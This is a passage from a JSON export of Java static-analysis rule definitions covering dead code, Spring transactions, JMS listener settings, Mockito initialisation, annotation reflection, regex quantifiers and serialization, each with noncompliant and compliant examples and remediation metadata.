}\n\n  /**\n   * @throws IOException Overriding classes may throw this exception if they print values into a file\n   */\n  protected void print() throws IOException { // no issue, method is overridable and the exception has proper javadoc\n    System.out.println(\"foo\");\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy",
                "error-handling",
                "redundant",
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2583",
            "repo": "java",
            "name": "Conditionally executed code should be reachable",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Conditional expressions which are always <code>true</code> or <code>false</code> can lead to dead code. Such code is always buggy and should never\nbe used in production.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\na = false;\nif (a) { // Noncompliant\n  doSomething(); // never executed\n}\n\nif (!a || b) { // Noncompliant; \"!a\" is always \"true\", \"b\" is never evaluated\n  doSomething();\n} else {\n  doSomethingElse(); // never executed\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule will not raise an issue in either of these cases:</p>\n<ul>\n  <li> When the condition is a single <code>final boolean</code> </li>\n</ul>\n<pre>\nfinal boolean debug = false;\n//...\nif (debug) {\n  // Print something\n}\n</pre>\n<ul>\n  <li> When the condition is literally <code>true</code> or <code>false</code>. </li>\n</ul>\n<pre>\nif (true) {\n  // do something\n}\n</pre>\n<p>In these cases it is obvious the code is as intended.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/570.html\">MITRE, CWE-570</a> - Expression is Always False </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/571\">MITRE, CWE-571</a> - Expression is Always True </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n</ul>",
            "mdDesc": "<p>Conditional expressions which are always <code>true</code> or <code>false</code> can lead to dead code. Such code is always buggy and should never\nbe used in production.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\na = false;\nif (a) { // Noncompliant\n  doSomething(); // never executed\n}\n\nif (!a || b) { // Noncompliant; \"!a\" is always \"true\", \"b\" is never evaluated\n  doSomething();\n} else {\n  doSomethingElse(); // never executed\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule will not raise an issue in either of these cases:</p>\n<ul>\n  <li> When the condition is a single <code>final boolean</code> </li>\n</ul>\n<pre>\nfinal boolean debug = false;\n//...\nif (debug) {\n  // Print something\n}\n</pre>\n<ul>\n  <li> When the condition is literally <code>true</code> or <code>false</code>. </li>\n</ul>\n<pre>\nif (true) {\n  // do something\n}\n</pre>\n<p>In these cases it is obvious the code is as intended.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/570.html\">MITRE, CWE-570</a> - Expression is Always False </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/571\">MITRE, CWE-571</a> - Expression is Always True </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "pitfall",
                "suspicious",
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2229",
            "repo": "java",
            "name": "Methods should not call same-class methods with incompatible \"@Transactional\" values",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When using Spring proxies, calling a method in the same class (e.g. <code>this.aMethod()</code>) with an incompatible <code>@Transactional</code>\nrequirement will result in runtime exceptions because Spring only \"sees\" the caller and makes no provisions for properly invoking the callee. </p>\n<p>Therefore, certain calls should never be made within the same class:</p>\n<table>\n  <tbody>\n    <tr>\n      <th>From</th>\n      <th>To</th>\n    </tr>\n    <tr>\n      <td> non-<code>@Transactional</code> </td>\n      <td> MANDATORY, NESTED, REQUIRED, REQUIRES_NEW </td>\n    </tr>\n    <tr>\n      <td> MANDATORY </td>\n      <td> NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW </td>\n    </tr>\n    <tr>\n      <td> NESTED </td>\n      <td> NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW </td>\n    </tr>\n    <tr>\n      <td> NEVER </td>\n      <td> MANDATORY, NESTED, REQUIRED, REQUIRES_NEW </td>\n    </tr>\n    <tr>\n      <td> NOT_SUPPORTED </td>\n      <td> MANDATORY, NESTED, REQUIRED, REQUIRES_NEW </td>\n    </tr>\n    <tr>\n      <td> REQUIRED or <code>@Transactional</code> </td>\n      <td> NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW </td>\n    </tr>\n    <tr>\n      <td> REQUIRES_NEW </td>\n      <td> NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW </td>\n    </tr>\n    <tr>\n      <td> SUPPORTS </td>\n      <td> MANDATORY, NESTED, NEVER, NOT_SUPPORTED, REQUIRED, REQUIRES_NEW </td>\n    </tr>\n  </tbody>\n</table>\n<h2>Noncompliant Code Example</h2>\n<pre>\n\n@Override\npublic void doTheThing() {\n  // ...\n  actuallyDoTheThing();  // Noncompliant\n}\n\n@Override\n@Transactional\npublic void actuallyDoTheThing() {\n  // ...\n}\n</pre>",
            "mdDesc": "<p>When using Spring proxies, calling a method in the same class (e.g. <code>this.aMethod()</code>) with an incompatible <code>@Transactional</code>\nrequirement will result in runtime exceptions because Spring only \"sees\" the caller and makes no provisions for properly invoking the callee. </p>\n<p>Therefore, certain calls should never be made within the same class:</p>\n<table>\n  <tbody>\n    <tr>\n      <th>From</th>\n      <th>To</th>\n    </tr>\n    <tr>\n      <td> non-<code>@Transactional</code> </td>\n      <td> MANDATORY, NESTED, REQUIRED, REQUIRES_NEW </td>\n    </tr>\n    <tr>\n      <td> MANDATORY </td>\n      <td> NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW </td>\n    </tr>\n    <tr>\n      <td> NESTED </td>\n      <td> NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW </td>\n    </tr>\n    <tr>\n      <td> NEVER </td>\n      <td> MANDATORY, NESTED, REQUIRED, REQUIRES_NEW </td>\n    </tr>\n    <tr>\n      <td> NOT_SUPPORTED </td>\n      <td> MANDATORY, NESTED, REQUIRED, REQUIRES_NEW </td>\n    </tr>\n    <tr>\n      <td> REQUIRED or <code>@Transactional</code> </td>\n      <td> NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW </td>\n    </tr>\n    <tr>\n      <td> REQUIRES_NEW </td>\n      <td> NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW </td>\n    </tr>\n    <tr>\n      <td> SUPPORTS </td>\n      <td> MANDATORY, NESTED, NEVER, NOT_SUPPORTED, REQUIRED, REQUIRES_NEW </td>\n    </tr>\n  </tbody>\n</table>\n<h2>Noncompliant Code Example</h2>\n<pre>\n\n@Override\npublic void doTheThing() {\n  // ...\n  actuallyDoTheThing();  // Noncompliant\n}\n\n@Override\n@Transactional\npublic void actuallyDoTheThing() {\n  // ...\n}\n</pre>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S3439",
            "repo": "java",
            "name": "\"DefaultMessageListenerContainer\" instances should not drop messages during restarts",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>DefaultMessageListenerContainer</code> is implemented as a JMS poller. While the Spring container is shutting itself down, as each\nin-progress JMS <code>Consumer.receive()</code> call completes, any non-<code>null</code> return value will be a JMS message that the DMLC will\n<em>discard</em> due to the shutdown in progress. That will result in the received message never being processed. </p>\n<p>To prevent message loss during restart operations, set <code>acceptMessagesWhileStopping</code> to <code>true</code> so that such messages will be\nprocessed before shut down.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n&lt;bean id=\"listenerContainer\" class=\"org.springframework.jms.listener.DefaultMessageListenerContainer\"&gt;  &lt;!-- Noncompliant --&gt;\n   &lt;property name=\"connectionFactory\" ref=\"connFactory\" /&gt;\n   &lt;property name=\"destination\" ref=\"dest\" /&gt;\n   &lt;property name=\"messageListener\" ref=\"serviceAdapter\" /&gt;\n   &lt;property name=\"autoStartup\" value=\"true\" /&gt;\n   &lt;property name=\"concurrentConsumers\" value=\"10\" /&gt;\n   &lt;property name=\"maxConcurrentConsumers\" value=\"10\" /&gt;\n   &lt;property name=\"clientId\" value=\"myClientID\" /&gt;\n&lt;/bean&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n&lt;bean id=\"listenerContainer\" class=\"org.springframework.jms.listener.DefaultMessageListenerContainer\"&gt;\n   &lt;property name=\"connectionFactory\" ref=\"connFactory\" /&gt;\n   &lt;property name=\"destination\" ref=\"dest\" /&gt;\n   &lt;property name=\"messageListener\" ref=\"serviceAdapter\" /&gt;\n   &lt;property name=\"autoStartup\" value=\"true\" /&gt;\n   &lt;property name=\"concurrentConsumers\" value=\"10\" /&gt;\n   &lt;property name=\"maxConcurrentConsumers\" value=\"10\" /&gt;\n   &lt;property name=\"clientId\" value=\"myClientID\" /&gt;\n   &lt;property name=\"acceptMessagesWhileStopping\" value=\"true\" /&gt;\n&lt;/bean&gt;\n</pre>",
            "mdDesc": "<p><code>DefaultMessageListenerContainer</code> is implemented as a JMS poller. While the Spring container is shutting itself down, as each\nin-progress JMS <code>Consumer.receive()</code> call completes, any non-<code>null</code> return value will be a JMS message that the DMLC will\n<em>discard</em> due to the shutdown in progress. That will result in the received message never being processed. </p>\n<p>To prevent message loss during restart operations, set <code>acceptMessagesWhileStopping</code> to <code>true</code> so that such messages will be\nprocessed before shut down.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n&lt;bean id=\"listenerContainer\" class=\"org.springframework.jms.listener.DefaultMessageListenerContainer\"&gt;  &lt;!-- Noncompliant --&gt;\n   &lt;property name=\"connectionFactory\" ref=\"connFactory\" /&gt;\n   &lt;property name=\"destination\" ref=\"dest\" /&gt;\n   &lt;property name=\"messageListener\" ref=\"serviceAdapter\" /&gt;\n   &lt;property name=\"autoStartup\" value=\"true\" /&gt;\n   &lt;property name=\"concurrentConsumers\" value=\"10\" /&gt;\n   &lt;property name=\"maxConcurrentConsumers\" value=\"10\" /&gt;\n   &lt;property name=\"clientId\" value=\"myClientID\" /&gt;\n&lt;/bean&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n&lt;bean id=\"listenerContainer\" class=\"org.springframework.jms.listener.DefaultMessageListenerContainer\"&gt;\n   &lt;property name=\"connectionFactory\" ref=\"connFactory\" /&gt;\n   &lt;property name=\"destination\" ref=\"dest\" /&gt;\n   &lt;property name=\"messageListener\" ref=\"serviceAdapter\" /&gt;\n   &lt;property name=\"autoStartup\" value=\"true\" /&gt;\n   &lt;property name=\"concurrentConsumers\" value=\"10\" /&gt;\n   &lt;property name=\"maxConcurrentConsumers\" value=\"10\" /&gt;\n   &lt;property name=\"clientId\" value=\"myClientID\" /&gt;\n   &lt;property name=\"acceptMessagesWhileStopping\" value=\"true\" /&gt;\n&lt;/bean&gt;\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S5979",
            "repo": "java",
            "name": "Annotated Mockito objects should be initialized",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Objects annotated with Mockito annotations <code>@Mock</code>,&nbsp;<code>@Spy</code>,&nbsp;<code>@Captor</code>,&nbsp;or <code>@InjectMocks</code>\nneed to be initialized explicitly.</p>\n<p>There are several ways to do this:</p>\n<p> * Call <code>MockitoAnnotations.openMocks(this)</code> or&nbsp;<code>MockitoAnnotations.initMocks(this)</code>&nbsp;in a setup method</p>\n<p> * Annotate test class with&nbsp;<code>@RunWith(MockitoJUnitRunner.class)</code>&nbsp;(JUnit 4)</p>\n<p> * Annotate test class with&nbsp;<code>@ExtendWith(MockitoExtension.class)</code>&nbsp;(JUnit 5 Jupiter)</p>\n<p> * Use&nbsp;<code>@Rule public MockitoRule rule = MockitoJUnit.rule();</code></p>\n<p>Test using uninitialized mocks will fail.</p>\n<p>Note that this only applies to annotated Mockito objects. It is not necessary to initialize objects instantiated via <code>Mockito.mock()</code> or\n<code>Mockito.spy()</code>.</p>\n<p>This rule raises an issue when a test class uses uninitialized mocks.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class FooTest { // Noncompliant: Mockito initialization missing\n  @Mock private Bar bar;\n\n  @Spy private Baz baz;\n\n  @InjectMocks private Foo fooUnderTest;\n\n  @Test\n  void someTest() {\n    // test something ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@RunWith(MockitoJUnitRunner.class)\npublic class FooTest {\n  @Mock private Bar bar;\n  // ...\n}\n</pre>\n<pre>\n@ExtendWith(MockitoExtension.class)\npublic class FooTest {\n  @Mock private Bar bar;\n  // ...\n}\n</pre>\n<pre>\npublic class FooTest {\n  @Rule\n  public MockitoRule rule = MockitoJUnit.rule();\n\n  @Mock private Bar bar;\n  // ...\n}\n</pre>\n<pre>\npublic class FooTest {\n  @Mock private Bar bar;\n  // ...\n\n  @BeforeEach\n  void setUp() {\n    MockitoAnnotations.openMocks(this);\n  }\n  // ...\n}\n</pre>\n<pre>\npublic class FooTest {\n  @Mock private Bar bar;\n  // ...\n\n  @Before\n  void setUp() {\n    MockitoAnnotations.initMocks(this);\n  }\n  // ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://site.mockito.org/javadoc/current/org/mockito/MockitoAnnotations.html\">Mockito documentation - MockitoAnnotations</a> </li>\n  <li> <a href=\"https://site.mockito.org/javadoc/current/org/mockito/junit/MockitoRule.html\">Mockito documentation - MockitoRule </a> </li>\n</ul>",
            "mdDesc": "<p>Objects annotated with Mockito annotations <code>@Mock</code>,&nbsp;<code>@Spy</code>,&nbsp;<code>@Captor</code>,&nbsp;or <code>@InjectMocks</code>\nneed to be initialized explicitly.</p>\n<p>There are several ways to do this:</p>\n<p> * Call <code>MockitoAnnotations.openMocks(this)</code> or&nbsp;<code>MockitoAnnotations.initMocks(this)</code>&nbsp;in a setup method</p>\n<p> * Annotate test class with&nbsp;<code>@RunWith(MockitoJUnitRunner.class)</code>&nbsp;(JUnit 4)</p>\n<p> * Annotate test class with&nbsp;<code>@ExtendWith(MockitoExtension.class)</code>&nbsp;(JUnit 5 Jupiter)</p>\n<p> * Use&nbsp;<code>@Rule public MockitoRule rule = MockitoJUnit.rule();</code></p>\n<p>Test using uninitialized mocks will fail.</p>\n<p>Note that this only applies to annotated Mockito objects. It is not necessary to initialize objects instantiated via <code>Mockito.mock()</code> or\n<code>Mockito.spy()</code>.</p>\n<p>This rule raises an issue when a test class uses uninitialized mocks.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class FooTest { // Noncompliant: Mockito initialization missing\n  @Mock private Bar bar;\n\n  @Spy private Baz baz;\n\n  @InjectMocks private Foo fooUnderTest;\n\n  @Test\n  void someTest() {\n    // test something ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@RunWith(MockitoJUnitRunner.class)\npublic class FooTest {\n  @Mock private Bar bar;\n  // ...\n}\n</pre>\n<pre>\n@ExtendWith(MockitoExtension.class)\npublic class FooTest {\n  @Mock private Bar bar;\n  // ...\n}\n</pre>\n<pre>\npublic class FooTest {\n  @Rule\n  public MockitoRule rule = MockitoJUnit.rule();\n\n  @Mock private Bar bar;\n  // ...\n}\n</pre>\n<pre>\npublic class FooTest {\n  @Mock private Bar bar;\n  // ...\n\n  @BeforeEach\n  void setUp() {\n    MockitoAnnotations.openMocks(this);\n  }\n  // ...\n}\n</pre>\n<pre>\npublic class FooTest {\n  @Mock private Bar bar;\n  // ...\n\n  @Before\n  void setUp() {\n    MockitoAnnotations.initMocks(this);\n  }\n  // ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://site.mockito.org/javadoc/current/org/mockito/MockitoAnnotations.html\">Mockito documentation - MockitoAnnotations</a> </li>\n  <li> <a href=\"https://site.mockito.org/javadoc/current/org/mockito/junit/MockitoRule.html\">Mockito documentation - MockitoRule </a> </li>\n</ul>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "mockito",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2109",
            "repo": "java",
            "name": "Reflection should not be used to check non-runtime annotations",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The writer of an annotation can set one of three retention policies for it:</p>\n<ul>\n  <li> <code>RetentionPolicy.SOURCE</code> - these annotations are dropped during compilation, E.G. <code>@Override</code>,\n  <code>@SuppressWarnings</code>. </li>\n  <li> <code>RetentionPolicy.CLASS</code> - these annotations are present in a compiled class but not loaded into the JVM at runtime. This is the\n  default. </li>\n  <li> <code>RetentionPolicy.RUNTIME</code> - these annotations are present in the class file and loaded into the JVM. </li>\n</ul>\n<p>Only annotations that have been given a <code>RUNTIME</code> retention policy will be available to reflection. Testing for annotations with any\nother retention policy is simply an error, since the test will always return false.</p>\n<p>This rule checks that reflection is not used to detect annotations that do not have <code>RUNTIME</code> retention.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nMethod m = String.class.getMethod(\"getBytes\", new Class[] {int.class,\nint.class, byte[].class, int.class});\nif (m.isAnnotationPresent(Override.class)) {  // Noncompliant; test will always return false, even when @Override is present in the code\n</pre>",
            "mdDesc": "<p>The writer of an annotation can set one of three retention policies for it:</p>\n<ul>\n  <li> <code>RetentionPolicy.SOURCE</code> - these annotations are dropped during compilation, E.G. <code>@Override</code>,\n  <code>@SuppressWarnings</code>. </li>\n  <li> <code>RetentionPolicy.CLASS</code> - these annotations are present in a compiled class but not loaded into the JVM at runtime. This is the\n  default. </li>\n  <li> <code>RetentionPolicy.RUNTIME</code> - these annotations are present in the class file and loaded into the JVM. </li>\n</ul>\n<p>Only annotations that have been given a <code>RUNTIME</code> retention policy will be available to reflection. Testing for annotations with any\nother retention policy is simply an error, since the test will always return false.</p>\n<p>This rule checks that reflection is not used to detect annotations that do not have <code>RUNTIME</code> retention.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nMethod m = String.class.getMethod(\"getBytes\", new Class[] {int.class,\nint.class, byte[].class, int.class});\nif (m.isAnnotationPresent(Override.class)) {  // Noncompliant; test will always return false, even when @Override is present in the code\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S5857",
            "repo": "java",
            "name": "Character classes should be preferred over reluctant quantifiers in regular expressions",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using reluctant quantifiers (also known as lazy or non-greedy quantifiers) in patterns can often lead to needless backtracking, making the regex\nneedlessly inefficient and potentially vulnerable to <a href=\"https://www.regular-expressions.info/catastrophic.html\">catastrophic backtracking</a>.\nParticularly when using <code>.*?</code> or <code>.+?</code> to match anything up to some terminating character, it is usually a better idea to\ninstead use a greedily or possessively quantified negated character class containing the terminating character. For example <code>&lt;.+?&gt;</code>\nshould be replaced with <code>&lt;[^&gt;]++&gt;</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n&lt;.+?&gt;\n\".*?\"\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n&lt;[^&gt;]++&gt;\n\"[^\"]*+\"\n</pre>\n<p>or</p>\n<pre>\n&lt;[^&gt;]+&gt;\n\"[^\"]*\"\n</pre>\n<h2>Exceptions</h2>\n<p>This rule only applies in cases where the reluctant quantifier can easily be replaced with a negated character class. That means the repetition has\nto be terminated by a single character or character class. Patterns such as the following, where the alternatives without reluctant quantifiers are\nmore complicated, are therefore not subject to this rule:</p>\n<pre>\n&lt;!--.*?--&gt;\n/\\*.*?\\*/\n</pre>",
            "mdDesc": "<p>Using reluctant quantifiers (also known as lazy or non-greedy quantifiers) in patterns can often lead to needless backtracking, making the regex\nneedlessly inefficient and potentially vulnerable to <a href=\"https://www.regular-expressions.info/catastrophic.html\">catastrophic backtracking</a>.\nParticularly when using <code>.*?</code> or <code>.+?</code> to match anything up to some terminating character, it is usually a better idea to\ninstead use a greedily or possessively quantified negated character class containing the terminating character. For example <code>&lt;.+?&gt;</code>\nshould be replaced with <code>&lt;[^&gt;]++&gt;</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n&lt;.+?&gt;\n\".*?\"\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n&lt;[^&gt;]++&gt;\n\"[^\"]*+\"\n</pre>\n<p>or</p>\n<pre>\n&lt;[^&gt;]+&gt;\n\"[^\"]*\"\n</pre>\n<h2>Exceptions</h2>\n<p>This rule only applies in cases where the reluctant quantifier can easily be replaced with a negated character class. That means the repetition has\nto be terminated by a single character or character class. Patterns such as the following, where the alternatives without reluctant quantifiers are\nmore complicated, are therefore not subject to this rule:</p>\n<pre>\n&lt;!--.*?--&gt;\n/\\*.*?\\*/\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3437",
            "repo": "java",
            "name": "Value-based objects should not be serialized",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>According to the documentation,</p>\n<blockquote>\n  A program may produce unpredictable results if it attempts to distinguish two references to equal values of a value-based class, whether directly\n  via reference equality or indirectly via an appeal to synchronization, identity hashing, serialization...\n</blockquote>\n<p>For example (credit to Brian Goetz), imagine Foo is a value-based class:</p>\n<pre>\nFoo[] arr = new Foo[2];\narr[0] = new Foo(0);\narr[1] = new Foo(0);\n</pre>\n<p>Serialization promises that on deserialization of arr, elements 0 and 1 will not be aliased. Similarly, in:</p>\n<pre>\nFoo[] arr = new Foo[2];\narr[0] = new Foo(0);\narr[1] = arr[0];\n</pre>\n<p>Serialization promises that on deserialization of <code>arr</code>, elements 0 and 1 <strong>will</strong> be aliased.</p>\n<p>While these promises are coincidentally fulfilled in current implementations of Java, that is not guaranteed in the future, particularly when true\nvalue types are introduced in the language.</p>\n<p>This rule raises an issue when a <code>Serializable</code> class defines a non-transient, non-static field field whose type is a known serializable\nvalue-based class. Known serializable value-based classes are: all the classes in the <code>java.time</code> package except <code>Clock</code>; the\ndate classes for alternate calendars: <code>HijrahDate</code>, <code>JapaneseDate</code>, <code>MinguoDate</code>, <code>ThaiBuddhistDate</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass implements Serializable {\n  private HijrahDate date;  // Noncompliant; mark this transient\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass implements Serializable {\n  private transient HijrahDate date;\n  // ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/doc-files/ValueBased.html\">Value-based classes</a> </li>\n</ul>",
            "mdDesc": "<p>According to the documentation,</p>\n<blockquote>\n  A program may produce unpredictable results if it attempts to distinguish two references to equal values of a value-based class, whether directly\n  via reference equality or indirectly via an appeal to synchronization, identity hashing, serialization...\n</blockquote>\n<p>For example (credit to Brian Goetz), imagine Foo is a value-based class:</p>\n<pre>\nFoo[] arr = new Foo[2];\narr[0] = new Foo(0);\narr[1] = new Foo(0);\n</pre>\n<p>Serialization promises that on deserialization of arr, elements 0 and 1 will not be aliased. Similarly, in:</p>\n<pre>\nFoo[] arr = new Foo[2];\narr[0] = new Foo(0);\narr[1] = arr[0];\n</pre>\n<p>Serialization promises that on deserialization of <code>arr</code>, elements 0 and 1 <strong>will</strong> be aliased.</p>\n<p>While these promises are coincidentally fulfilled in current implementations of Java, that is not guaranteed in the future, particularly when true\nvalue types are introduced in the language.</p>\n<p>This rule raises an issue when a <code>Serializable</code> class defines a non-transient, non-static field field whose type is a known serializable\nvalue-based class. Known serializable value-based classes are: all the classes in the <code>java.time</code> package except <code>Clock</code>; the\ndate classes for alternate calendars: <code>HijrahDate</code>, <code>JapaneseDate</code>, <code>MinguoDate</code>, <code>ThaiBuddhistDate</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass implements Serializable {\n  private HijrahDate date;  // Noncompliant; mark this transient\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass implements Serializable {\n  private transient HijrahDate date;\n  // ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/doc-files/ValueBased.html\">Value-based classes</a> </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8",
                "lock-in",
                "serialization"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3438",
            "repo": "java",
            "name": "\"SingleConnectionFactory\" instances should be set to \"reconnectOnException\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Use of a Spring <code>SingleConnectionFactory</code> without enabling the <code>reconnectOnException</code> setting will prevent automatic\nconnection recovery when the connection goes bad. </p>\n<p>That's because the <code>reconnectOnException</code> property defaults to <code>false</code>. As a result, even if the code that uses this\nconnection factory (Spring's <code>DefaultMessageListenerContainer</code> or your own code) has reconnect logic, that code won't work because the\n<code>SingleConnectionFactory</code> will act like a single-connection pool by preventing connection <code>close</code> calls from actually closing\nanything. As a result, subsequent factory <code>create</code> operations will just hand back the original broken <code>Connection</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n &lt;bean id=\"singleCF\" class=\"org.springframework.jms.connection.SingleConnectionFactory\"&gt;  &lt;!-- Noncompliant --&gt;\n   &lt;constructor-arg ref=\"dummyConnectionFactory\" /&gt;\n &lt;/bean&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n &lt;bean 